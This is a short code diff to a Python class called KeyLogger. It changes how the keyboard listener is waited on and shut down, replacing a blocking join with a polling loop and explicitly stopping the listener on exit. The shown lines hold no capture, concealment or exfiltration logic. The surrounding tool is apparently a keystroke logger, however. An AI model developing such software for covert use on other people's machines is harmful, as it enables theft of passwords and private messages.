@@ -163,11 +163,14 @@ class KeyLogger:
         self.keyboard_listener.start()
 
         try:
-            self.keyboard_listener.join()
+            while self.keyboard_listener.is_alive() and not self._stop_monitor.is_set():
+                time.sleep(0.2)
         except KeyboardInterrupt:
             print("\n已停止")
         finally:
             self._stop_monitor.set()
+            if self.keyboard_listener.is_alive():
+                self.keyboard_listener.stop()
             self._close_log()
 
     @staticmethod
